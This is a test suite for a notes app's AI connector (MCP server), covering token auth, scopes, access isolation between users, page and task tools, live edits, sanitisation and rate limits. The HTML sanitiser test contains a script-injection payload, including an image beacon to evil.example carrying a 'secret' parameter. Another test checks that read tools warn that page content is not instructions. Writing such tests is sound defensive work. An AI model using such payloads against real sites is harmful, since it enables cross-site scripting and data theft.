// The AI connector (/mcp, server/mcp/): auth, scopes, access rules, every tool, live edits, caps.
// OAuth itself is phase 1 (server/oauth/): its verifier is swapped for a fake token table here.
import { before, after, test } from 'node:test';
import assert from 'node:assert/strict';
import * as Y from 'yjs';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { startTestApp, type TestApp, type TestUser } from './helpers/app.ts';
import { collabClient, synced, waitFor } from './helpers/collab.ts';
import type { ActivityItem } from '../shared/types.ts';

type Scope = 'notes:read' | 'notes:write';
let app: TestApp;
const tokens = new Map<string, { userId: string; scopes: Scope[]; clientId: string; clientName: string }>();
let seq = 0;

before(async () => {
  app = await startTestApp();
  const { setMcpTokenVerifier } = await import('../server/mcp/index.ts');
  setMcpTokenVerifier(async (t) => tokens.get(t) ?? null);
});
after(() => app.close());

/** A fake OAuth access token for `u`. */
function tokenFor(u: TestUser, scopes: Scope[] = ['notes:read', 'notes:write'], clientName = 'Test AI') {
  const t = `tok-${++seq}-${u.user.id}`;
  tokens.set(t, { userId: u.user.id, scopes, clientId: 'client-1', clientName });
  return t;
}

async function post(token: string | null, body: unknown, method = 'POST') {
  const res = await fetch(`${app.origin}/mcp`, {
    method,
    headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: method === 'POST' ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  return { status: res.status, headers: res.headers, data: text ? JSON.parse(text) : null };
}

/** tools/call → { text, isError }. */
async function call(token: string, name: string, args: Record<string, unknown> = {}) {
  const r = await post(token, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } });
  assert.equal(r.status, 200, JSON.stringify(r.data));
  const result = r.data.result as { content: { text: string }[]; isError?: boolean };
  return { text: result.content[0].text, isError: !!result.isError };
}
/** A tool call that must succeed, parsed as JSON. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
async function json<T = any>(token: string, name: string, args: Record<string, unknown> = {}): Promise<T> {
  const r = await call(token, name, args);
  assert.equal(r.isError, false, r.text);
  return JSON.parse(r.text) as T;
}

async function firstSection(u: TestUser) {
  return (await app.call('GET', `/workspaces/${u.wsId}/tree`, u.token)).data.sections[0].id as string;
}

const scopeParams = (h: string) => (h.match(/\bscope="/g) ?? []).length;

/** Pages titled `title` in the user's workspace. */
async function pageCount(u: TestUser, title: string) {
  return ((await app.call('GET', `/workspaces/${u.wsId}/tree`, u.token)).data.pages as { title: string }[]).filter((p) => p.title === title).length;
}

async function pageDoc(pageId: string) {
  const { pageDocState } = await import('../server/collab.ts');
  const doc = new Y.Doc();
  Y.applyUpdate(doc, pageDocState(pageId)!);
  return doc;
}

test('auth: no token or a bad one is a 401 that points at the OAuth metadata; GET is 405; preflight is open', async () => {
  const none = await post(null, { jsonrpc: '2.0', id: 1, method: 'tools/list' });
  assert.equal(none.status, 401);
  assert.match(none.headers.get('www-authenticate')!, /^Bearer resource_metadata="https?:\/\/[^"]+\/\.well-known\/oauth-protected-resource\/mcp", scope="notes:read notes:write"$/);
  const bad = await post('not-a-token', { jsonrpc: '2.0', id: 1, method: 'tools/list' });
  assert.equal(bad.status, 401);
  assert.match(bad.headers.get('www-authenticate')!, /error="invalid_token"/);
  assert.equal(scopeParams(bad.headers.get('www-authenticate')!), 1, 'one scope parameter');
  // A normal app session token is not an MCP token.
  const u = await app.signUp('Sessiontoken');
  assert.equal((await post(u.token, { jsonrpc: '2.0', id: 1, method: 'tools/list' })).status, 401);
  // A token whose user no longer exists.
  tokens.set('ghost', { userId: 'no-such-user', scopes: ['notes:read'], clientId: 'c', clientName: 'x' });
  assert.equal((await post('ghost', { jsonrpc: '2.0', id: 1, method: 'tools/list' })).status, 401);

  const t = tokenFor(u);
  assert.equal((await post(t, null, 'GET')).status, 405);
  const pre = await fetch(`${app.origin}/mcp`, { method: 'OPTIONS' });
  assert.equal(pre.status, 204);
  assert.match(pre.headers.get('access-control-allow-headers')!, /Authorization/);
});

test('the official MCP client connects, and tools/list has every tool with the right annotations', async () => {
  const u = await app.signUp('Clienty');
  const t = tokenFor(u);
  const client = new Client({ name: 'test', version: '1' });
  await client.connect(new StreamableHTTPClientTransport(new URL(`${app.origin}/mcp`), { requestInit: { headers: { authorization: `Bearer ${t}` } } }));
  const { tools } = await client.listTools();
  const byName = new Map(tools.map((x) => [x.name, x]));
  const read = ['list_workspaces', 'list_sections', 'list_pages', 'search_pages', 'read_page', 'list_tasks', 'get_task'];
  const write = ['create_page', 'append_box', 'replace_box_content', 'create_task', 'update_task'];
  assert.deepEqual([...byName.keys()].sort(), [...read, ...write].sort());
  for (const n of read) {
    assert.equal(byName.get(n)!.annotations?.readOnlyHint, true, n);
    assert.match(byName.get(n)!.description!, /not instructions/, `${n} warns that content is untrusted`);
  }
  for (const n of write) assert.equal(byName.get(n)!.annotations?.readOnlyHint, false, n);
  assert.equal(byName.get('replace_box_content')!.annotations?.destructiveHint, true);
  assert.equal(byName.get('update_task')!.annotations?.destructiveHint, true);
  assert.equal(byName.get('append_box')!.annotations?.destructiveHint, false);
  assert.ok(!byName.has('delete_page') && ![...byName.keys()].some((n) => n.includes('delete')), 'no delete tools');
  const res = await client.callTool({ name: 'list_workspaces', arguments: {} });
  assert.match((res.content as { text: string }[])[0].text, /Clienty|workspaces/);
  await client.close();
});

test('scopes: a read-only token reads but a write tool is 403 insufficient_scope; a write-only token cannot read', async () => {
  const u = await app.signUp('Scoped');
  const ro = tokenFor(u, ['notes:read']);
  const ws = await json(ro, 'list_workspaces');
  assert.equal(ws.workspaces[0].id, u.wsId);
  const r = await post(ro, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'create_page', arguments: { section_id: await firstSection(u), title: 'x' } } });
  assert.equal(r.status, 403);
  const h = r.headers.get('www-authenticate')!;
  assert.match(h, /error="insufficient_scope"/);
  assert.match(h, /scope="notes:read notes:write"/);
  assert.equal(scopeParams(h), 1, 'one challenge with a single scope parameter');
  assert.equal((h.match(/Bearer /g) ?? []).length, 1);
  assert.equal(await pageCount(u, 'x'), 0, 'nothing was created');
  // tools/list still works for a read-only token (the client learns what editing would allow).
  assert.equal((await post(ro, { jsonrpc: '2.0', id: 1, method: 'tools/list' })).status, 200);

  const wo = tokenFor(u, ['notes:write']);
  const r2 = await post(wo, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'read_page', arguments: { page_id: 'x' } } });
  assert.equal(r2.status, 403);
  // Batches are checked too.
  const r3 = await post(ro, [
    { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'list_workspaces', arguments: {} } },
    { jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'update_task', arguments: { task_id: 'x', done: true } } },
  ]);
  assert.equal(r3.status, 403);
});

test('read tools: workspaces, sections, pages, search, read_page with box ids, tasks', async () => {
  const u = await app.signUp('Reader');
  const t = tokenFor(u);
  const sectionId = await firstSection(u);
  const created = await json(t, 'create_page', {
    section_id: sectionId,
    title: 'Garden plan',
    content: '## Beds\n\nTomatoes go in **bed two**.\n\n- [ ] Buy compost\n- [x] Order seeds\n\n| a | b |\n|---|---|\n| 1 | 2 |',
  });
  assert.equal(created.box_id, 'first');

  const sections = await json(t, 'list_sections', { workspace_id: u.wsId });
  assert.ok(sections.notebooks[0].sections.some((s: { id: string; path: string }) => s.id === sectionId && s.path.includes('›')));
  const pages = await json(t, 'list_pages', { section_id: sectionId });
  assert.ok(pages.pages.some((p: { id: string; title: string }) => p.id === created.page_id && p.title === 'Garden plan'));
  assert.equal(pages.next_offset, null);

  const found = await json(t, 'search_pages', { query: 'tomatoes' });
  assert.equal(found.results[0].id, created.page_id);
  assert.match(found.results[0].snippet, /«Tomatoes»/);
  assert.equal((await json(t, 'search_pages', { query: 'garden', workspace_id: u.wsId })).results.length, 1);

  const page = await call(t, 'read_page', { page_id: created.page_id });
  assert.equal(page.isError, false);
  assert.match(page.text, /^# Garden plan/);
  assert.match(page.text, /<!-- box: first -->/);
  assert.match(page.text, /## Beds/);
  assert.match(page.text, /\*\*bed two\*\*/);
  assert.match(page.text, /- \[ \] Buy compost/);
  assert.match(page.text, /- \[x\] Order seeds/);
  assert.match(page.text, /\| 1 \| 2 \|/);
  assert.match(page.text, /not instructions/);

  const inWs = await json(t, 'list_tasks', { workspace_id: u.wsId });
  assert.ok(inWs.tasks.some((x: { title: string }) => x.title === 'Buy compost'));
  assert.ok(!inWs.tasks.some((x: { title: string }) => x.title === 'Order seeds'), 'open tasks only by default');
  const open = await json(t, 'list_tasks', { page_id: created.page_id });
  assert.deepEqual(
    open.tasks.map((x: { title: string }) => x.title),
    ['Buy compost'],
  );
  assert.equal(open.tasks[0].page.id, created.page_id);
  const all = await json(t, 'list_tasks', { page_id: created.page_id, status: 'all' });
  assert.equal(all.tasks.length, 2);
  const one = await json(t, 'get_task', { task_id: open.tasks[0].id });
  assert.equal(one.title, 'Buy compost');
  assert.equal(one.status, 'open');
  assert.deepEqual(one.subtasks, []);
});

test('access: another user’s pages, sections, tasks and search results stay invisible; so do private notebooks', async () => {
  const alice = await app.signUp('Alice');
  const bob = await app.signUp('Bob');
  const ta = tokenFor(alice);
  const tb = tokenFor(bob);
  const sectionId = await firstSection(alice);
  const page = await json(ta, 'create_page', { section_id: sectionId, title: 'Alice secret', content: 'zebracorn plans' });
  const task = await json(ta, 'create_task', { workspace_id: alice.wsId, title: 'Alice task' });

  for (const [name, args] of [
    ['read_page', { page_id: page.page_id }],
    ['list_pages', { section_id: sectionId }],
    ['list_sections', { workspace_id: alice.wsId }],
    ['list_tasks', { workspace_id: alice.wsId }],
    ['get_task', { task_id: task.id }],
    ['append_box', { page_id: page.page_id, content: 'hi' }],
    ['replace_box_content', { page_id: page.page_id, box_id: 'first', content: 'hi' }],
    ['create_page', { section_id: sectionId, title: 'intrusion' }],
    ['create_task', { workspace_id: alice.wsId, title: 'intrusion' }],
    ['create_task', { page_id: page.page_id, title: 'intrusion' }],
    ['update_task', { task_id: task.id, done: true }],
  ] as const) {
    const r = await call(tb, name, args);
    assert.equal(r.isError, true, `${name} must fail for Bob`);
    assert.match(r.text, /not found/i, name);
  }
  assert.equal((await json(tb, 'search_pages', { query: 'zebracorn' })).results.length, 0);
  assert.equal((await json(tb, 'list_workspaces')).workspaces.some((w: { id: string }) => w.id === alice.wsId), false);

  // Bob joins as a member; a private notebook of Alice's stays hidden from him.
  await app.call('POST', `/workspaces/${alice.wsId}/members`, alice.token, { email: bob.user.email, role: 'member' });
  const nb = (await app.call('POST', `/workspaces/${alice.wsId}/notebooks`, alice.token, { name: 'Diary', visibility: 'private' })).data.id;
  const sec = (await app.call('POST', `/notebooks/${nb}/sections`, alice.token, { name: 'Days' })).data.id;
  const priv = await json(ta, 'create_page', { section_id: sec, title: 'Private day', content: 'quokkaflux' });
  assert.equal((await call(tb, 'read_page', { page_id: priv.page_id })).isError, true);
  assert.equal((await json(tb, 'search_pages', { query: 'quokkaflux' })).results.length, 0);
  const secs = await json(tb, 'list_sections', { workspace_id: alice.wsId });
  assert.equal(secs.notebooks.some((n: { id: string }) => n.id === nb), false);
  // The shared page is now readable by Bob.
  assert.equal((await call(tb, 'read_page', { page_id: page.page_id })).isError, false);
});

test('access: a viewer reads but cannot write', async () => {
  const owner = await app.signUp('Owner');
  const viewer = await app.signUp('Viewer');
  await app.call('POST', `/workspaces/${owner.wsId}/members`, owner.token, { email: viewer.user.email, role: 'viewer' });
  const page = await json(tokenFor(owner), 'create_page', { section_id: await firstSection(owner), title: 'Read me', content: 'hello' });
  const tv = tokenFor(viewer);
  assert.equal((await call(tv, 'read_page', { page_id: page.page_id })).isError, false);
  const r = await call(tv, 'append_box', { page_id: page.page_id, content: 'nope' });
  assert.equal(r.isError, true);
  assert.match(r.text, /view-only/);
  assert.equal((await call(tv, 'create_page', { section_id: await firstSection(owner), title: 'nope' })).isError, true);
});

test('trash: a trashed page is invisible to every tool, though its owner could restore it', async () => {
  const u = await app.signUp('Trasher');
  const t = tokenFor(u);
  const sectionId = await firstSection(u);
  const page = await json(t, 'create_page', { section_id: sectionId, title: 'Old notes', content: 'wombatique\n\n- [ ] trashed todo' });
  assert.equal((await app.call('DELETE', `/pages/${page.page_id}`, u.token)).status, 200);
  const r = await call(t, 'read_page', { page_id: page.page_id });
  assert.equal(r.isError, true);
  assert.match(r.text, /not found/i);
  assert.equal((await json(t, 'list_pages', { section_id: sectionId })).pages.some((p: { id: string }) => p.id === page.page_id), false);
  assert.equal((await json(t, 'search_pages', { query: 'wombatique' })).results.length, 0);
  assert.equal((await call(t, 'append_box', { page_id: page.page_id, content: 'x' })).isError, true);
  assert.equal((await call(t, 'list_tasks', { page_id: page.page_id })).isError, true);
  // Its task stays in the task list (as in the app), without the page's title.
  const tasks = await json(t, 'list_tasks', { workspace_id: u.wsId });
  const todo = tasks.tasks.find((x: { title: string }) => x.title === 'trashed todo');
  assert.deepEqual(todo.page, { in_trash: true });
});

test('create_page: Markdown and HTML become sanitised boxes; scripts and images are dropped; activity says via the app', async () => {
  const u = await app.signUp('Creator');
  const t = tokenFor(u, ['notes:read', 'notes:write'], 'Claude');
  const sectionId = await firstSection(u);
  const html = await json(t, 'create_page', {
    section_id: sectionId,
    title: '  HTML   page ',
    format: 'html',
    content: '<h1>Head</h1><p onclick="x()">Para <a href="javascript:alert(1)">bad</a> <a href="https://example.com">good</a></p><script>alert(1)</script><img src="https://evil.example/x.png?d=secret"><iframe src="https://x"></iframe>',
  });
  assert.equal(html.title, 'HTML page');
  const doc = await pageDoc(html.page_id);
  const xml = doc.getXmlFragment('box:first').toString();
  assert.match(xml, /<heading/);
  assert.match(xml, /Para/);
  assert.match(xml, /https:\/\/example\.com/);
  assert.doesNotMatch(xml, /javascript|script|alert|evil|iframe|onclick/);
  assert.equal(doc.getMap('boxes').size, 1);

  const empty = await json(t, 'create_page', { section_id: sectionId, title: 'Blank' });
  assert.equal(empty.box_id, null);

  const feed = (await app.call('GET', `/workspaces/${u.wsId}/activity`, u.token)).data as ActivityItem[];
  assert.ok(feed.some((a) => a.summary === 'created page “HTML page” via Claude' && a.actorId === u.user.id), JSON.stringify(feed.map((a) => a.summary)));
});

test('append_box and replace_box_content: live in an open editor, versioned, tasks kept, attributed', async () => {
  const u = await app.signUp('Editor');
  const t = tokenFor(u, ['notes:read', 'notes:write'], 'ChatGPT');
  const page = await json(t, 'create_page', { section_id: await firstSection(u), title: 'Live', content: 'First line\n\n- [ ] Keep me\n- [ ] Rename me' });

  // Someone has the page open.
  const editor = collabClient(app, page.page_id, u.token);
  await synced(editor);
  const boxes = () => editor.doc.getMap('boxes');

  const added = await json(t, 'append_box', { page_id: page.page_id, content: 'A new box' });
  assert.equal(added.new_box, true);
  assert.notEqual(added.box_id, 'first');
  await waitFor(() => boxes().has(added.box_id) && editor.doc.getXmlFragment(`box:${added.box_id}`).toString().includes('A new box'), 3000, 'live box');
  const geom = boxes().get(added.box_id) as Y.Map<number>;
  assert.ok((geom.get('y') ?? 0) > 0, 'placed below the first box');

  await json(t, 'append_box', { page_id: page.page_id, box_id: 'first', content: 'Appended to first' });
  await waitFor(() => editor.doc.getXmlFragment('box:first').toString().includes('Appended to first'), 3000, 'live append');

  // Replace: "Keep me" is written again (same task), "Rename me" is left out (kept at the end), "Brand new" is new.
  const before = await json(t, 'list_tasks', { page_id: page.page_id });
  const keepId = before.tasks.find((x: { title: string }) => x.title === 'Keep me').id;
  const renameId = before.tasks.find((x: { title: string }) => x.title === 'Rename me').id;
  const r = await json(t, 'replace_box_content', { page_id: page.page_id, box_id: 'first', content: 'Rewritten\n\n- [x] Keep me\n- [ ] Brand new' });
  assert.deepEqual(r.kept_task_ids, [renameId]);
  await waitFor(() => editor.doc.getXmlFragment('box:first').toString().includes('Rewritten'), 3000, 'live replace');
  const first = editor.doc.getXmlFragment('box:first').toString();
  assert.doesNotMatch(first, /First line|Appended to first/);
  assert.ok(first.includes(keepId) && first.includes(renameId));
  const after = await json(t, 'list_tasks', { page_id: page.page_id, status: 'all' });
  assert.equal(after.tasks.length, 3);
  assert.equal(after.tasks.find((x: { id: string }) => x.id === keepId).status, 'done');

  // Empty content and unknown boxes are refused; nothing is deleted.
  assert.match((await call(t, 'replace_box_content', { page_id: page.page_id, box_id: 'first', content: '   ' })).text, /empty/);
  assert.match((await call(t, 'replace_box_content', { page_id: page.page_id, box_id: 'nope', content: 'x' })).text, /no box/);

  // Version history has the state from before the AI's edits, so they can be undone.
  const versions = (await app.call('GET', `/pages/${page.page_id}/versions`, u.token)).data as { id: string }[];
  assert.ok(versions.length >= 1);
  const texts = await Promise.all(
    versions.map(async (v) => {
      const d = new Y.Doc();
      Y.applyUpdate(d, new Uint8Array(Buffer.from((await app.call('GET', `/pages/${page.page_id}/versions/${v.id}`, u.token)).data.ydoc, 'base64')));
      return d.getXmlFragment('box:first').toString();
    }),
  );
  assert.ok(texts.some((x) => x.includes('First line') && !x.includes('Rewritten')), 'a version from before the replace');

  // The page is marked as edited by the user; activity says which app.
  const meta = (await app.call('GET', `/pages/${page.page_id}`, u.token)).data.page;
  assert.equal(meta.updatedBy, u.user.id);
  const feed = (await app.call('GET', `/workspaces/${u.wsId}/activity`, u.token)).data as ActivityItem[];
  const edits = feed.filter((a) => a.summary === 'edited “Live” via ChatGPT');
  assert.equal(edits.length, 1, 'consecutive edits by one app share an entry');
  assert.ok(!feed.some((a) => a.summary === 'edited “Live”'), 'the AI’s edits are not credited to the person as their own');
  editor.destroy();
});

test('task notes: read_page shows them nested; a rewrite keeps, replaces or leaves them as plain lines, never drops them', async () => {
  const u = await app.signUp('Noter');
  const t = tokenFor(u);
  const md = [
    '- [ ] Pack for the trip',
    '  - [x] passport',
    '  - [ ] adapter',
    '  - pack light',
    '- [ ] Call the hotel',
    '  - ask about late check-in',
    '- [ ] Old plan',
    '  - stale note',
  ].join('\n');
  const page = await json(t, 'create_page', { section_id: await firstSection(u), title: 'Trip', content: md });
  // Written nested: the indented lines are the tasks' notes; "- [ ]" lines in them are a plain checklist, not tasks.
  const read = (await call(t, 'read_page', { page_id: page.page_id })).text;
  assert.match(read, /- \[ \] Pack for the trip\n {2}- \[x\] passport\n {2}- \[ \] adapter\n {2}- pack light/);
  assert.match(read, /- \[ \] Call the hotel\n {2}- ask about late check-in/);
  let tasks = (await json(t, 'list_tasks', { page_id: page.page_id, status: 'all' })).tasks as { id: string; title: string }[];
  assert.deepEqual(tasks.map((x) => x.title).sort(), ['Call the hotel', 'Old plan', 'Pack for the trip'], 'checklist lines under a task are not tasks');
  // A real subtask written in the task's notes (as the editor makes them).
  const sub = (await app.call('POST', `/workspaces/${u.wsId}/tasks`, u.token, { title: 'Book taxi', pageId: page.page_id })).data as { id: string };
  const { editPageDoc } = await import('../server/collab.ts');
  const { findTaskElement } = await import('../server/taskNotes.ts');
  editPageDoc(page.page_id, (d) => {
    const ref = new Y.XmlElement('taskRef');
    ref.setAttribute('taskId', sub.id);
    findTaskElement(d, tasks.find((x) => x.title === 'Pack for the trip')!.id)!.push([ref]);
  });
  tasks = (await json(t, 'list_tasks', { page_id: page.page_id, status: 'all' })).tasks;
  const idOf = (title: string) => tasks.find((x) => x.title === title)!.id;

  // (1) "Pack for the trip" kept with nothing under it: its notes stay. (2) "Call the hotel" given new notes: those
  // replace the old ones. (3) "Old plan" left out: kept at the end, its note a plain line after it.
  const r = await json(t, 'replace_box_content', {
    page_id: page.page_id,
    box_id: 'first',
    content: ['Rewritten', '', '- [ ] Pack for the trip', '- [ ] Call the hotel', '  - ask for a quiet room'].join('\n'),
  });
  assert.deepEqual(r.kept_task_ids, [idOf('Old plan')]);
  const after = (await call(t, 'read_page', { page_id: page.page_id })).text;
  assert.match(after, /- \[ \] Pack for the trip\n {2}- \[x\] passport\n {2}- \[ \] adapter\n {2}- pack light\n {2}- \[ \] Book taxi/, 'kept notes');
  assert.match(after, /- \[ \] Call the hotel\n {2}- ask for a quiet room/, 'new notes');
  assert.doesNotMatch(after, /late check-in/);
  assert.match(after, /- \[ \] Old plan\n(\n)?- stale note/, 'left-out task: its note stays as a plain line after it');
  const doc = await pageDoc(page.page_id);
  const { taskPlaces } = await import('../server/taskNotes.ts');
  const places = taskPlaces(doc);
  assert.equal(places.filter((p) => p.id === idOf('Book taxi')).length, 1, 'the subtask is in the box once');
  assert.equal(places.find((p) => p.id === idOf('Old plan'))?.parent, null);
});

test('create_task and update_task: on a page (live), standalone and as a subtask; activity via the app', async () => {
  const u = await app.signUp('Tasker');
  const t = tokenFor(u, ['notes:read', 'notes:write'], 'Claude');
  const page = await json(t, 'create_page', { section_id: await firstSection(u), title: 'Tasks page' });
  const editor = collabClient(app, page.page_id, u.token);
  await synced(editor);

  const onPage = await json(t, 'create_task', { page_id: page.page_id, title: 'Call the plumber', due_date: '2026-12-01', priority: 2, assignee_id: 'me' });
  assert.equal(onPage.page.id, page.page_id);
  assert.equal(onPage.assignee.id, u.user.id);
  await waitFor(() => editor.doc.getXmlFragment('box:first').toString().includes(onPage.id), 3000, 'task in the page');

  const standalone = await json(t, 'create_task', { workspace_id: u.wsId, title: 'Standalone' });
  assert.equal(standalone.page, null);
  const sub = await json(t, 'create_task', { parent_task_id: onPage.id, title: 'Find the number' });
  assert.equal(sub.parent_task_id, onPage.id);
  assert.equal((await json(t, 'get_task', { task_id: onPage.id })).subtasks[0].id, sub.id);

  const done = await json(t, 'update_task', { task_id: onPage.id, done: true, title: 'Call the plumber today', due_date: null });
  assert.equal(done.status, 'done');
  assert.equal(done.title, 'Call the plumber today');
  assert.equal(done.due_date, null);
  assert.match((await call(t, 'update_task', { task_id: onPage.id })).text, /Nothing to change/);
  assert.equal((await call(t, 'create_task', { title: 'nowhere' })).isError, true);

  const feed = (await app.call('GET', `/workspaces/${u.wsId}/activity`, u.token)).data as ActivityItem[];
  assert.ok(feed.some((a) => a.summary === 'added task “Standalone” via Claude'));
  assert.ok(feed.some((a) => a.summary === 'completed “Call the plumber today” via Claude'));
  editor.destroy();
});

test('caps: oversized writes are refused, long pages are truncated with a notice, too many to-dos refused', async () => {
  const u = await app.signUp('Capper');
  const t = tokenFor(u);
  const sectionId = await firstSection(u);
  const big = await call(t, 'create_page', { section_id: sectionId, title: 'Big', content: 'x'.repeat(100_001) });
  assert.equal(big.isError, true);
  assert.equal(await pageCount(u, 'Big'), 0, 'nothing stored');
  const todos = await call(t, 'create_page', { section_id: sectionId, title: 'Todos', content: Array.from({ length: 51 }, (_, i) => `- [ ] t${i}`).join('\n') });
  assert.match(todos.text, /Too many task items/);
  const deep = await call(t, 'create_page', { section_id: sectionId, title: 'Deep', format: 'html', content: '<blockquote>'.repeat(80) + 'x' });
  assert.match(deep.text, /nested too deeply/);

  const long = await json(t, 'create_page', { section_id: sectionId, title: 'Long', content: Array.from({ length: 400 }, (_, i) => `Paragraph number ${i} with some words in it.`).join('\n\n') });
  const r = await call(t, 'read_page', { page_id: long.page_id, max_chars: 1000 });
  assert.match(r.text, /\[Truncated: showing 1000 of \d+ characters/);
  assert.ok(r.text.length < 3000);
  // Oversized request bodies are a JSON-RPC error.
  const huge = await post(t, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'list_workspaces', arguments: { pad: 'x'.repeat(1_100_000) } } });
  assert.equal(huge.status, 413);
});

test('rate limits: per user and per token, plus a write budget', async () => {
  const { takeMcp, LIMITS } = await import('../server/ratelimit.ts');
  for (let i = 0; i < LIMITS.mcpWriteUser.capacity; i++) assert.equal(takeMcp('rl-user', 'rl-token', true), 0);
  assert.ok(takeMcp('rl-user', 'rl-token', true) > 0, 'write budget spent');
  for (let i = 0; i < LIMITS.mcpToken.capacity; i++) assert.equal(takeMcp('rl-user', 'rl-token'), 0);
  assert.ok(takeMcp('rl-user', 'rl-token') > 0, 'token budget spent');
  assert.equal(takeMcp('rl-user', 'rl-token-2'), 0, 'another token of the same user still has its own budget');
});
